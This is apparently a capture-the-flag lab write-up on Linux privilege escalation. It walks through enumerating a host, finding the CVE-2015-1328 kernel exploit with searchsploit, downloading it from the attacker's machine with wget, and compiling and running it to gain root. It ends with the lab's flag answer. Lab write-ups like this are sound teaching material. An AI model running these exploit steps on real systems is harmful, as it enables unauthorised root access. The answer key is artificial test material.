# Linux Privilege Escalation

> Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Enumeration

```
hostname
uname -a
cat /etc/issue
python --version
```

![image](https://user-images.githubusercontent.com/90561566/195976275-e3fdd29f-8190-4f3b-8d1d-da5fc16514de.png)

![image](https://user-images.githubusercontent.com/90561566/195976293-3a425129-ca5c-4efa-b296-d4960ddf65b1.png)

```
searchsploit linux 3.13.0 Ubuntu 14.04
```

![image](https://user-images.githubusercontent.com/90561566/195976408-23a04384-0a58-480e-94db-a36695adaf17.png)

the answer is `CVE-2015-1328`

![image](https://user-images.githubusercontent.com/90561566/195976412-650b4a78-27d8-485e-81fe-41f56fa8be1a.png)

## Privilege Escalation: Kernel Exploits

download the exploit

```
searchsploit -m 37292.c
```

we can see it can't create or write file on target system, but we can move to /tmp directory to do it

```
cd /tmp
```

transfer the exploit to target system

```
ifconfig
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/90561566/195976643-301ee84d-5619-4cc4-a20d-49551b7cc829.png)

on target system

```
wget 10.18.7.11:8000/37292.c
```

![image](https://user-images.githubusercontent.com/90561566/195976619-7a4c67e1-ca26-4608-8574-bde302dbe47c.png)

run the exploit

```
gcc 37292.c -o abc
id
./abc
id
```

![image](https://user-images.githubusercontent.com/90561566/195976781-2ebebda2-6f78-4f9e-b099-8d3af3f810c6.png)

![image](https://user-images.githubusercontent.com/90561566/195976815-9132a76e-9b9f-49a1-af85-9b8e252bf3f5.png)

| Flag | flag1.txt |
| --- | --- |
| Answer | THM-28392872729920 |





















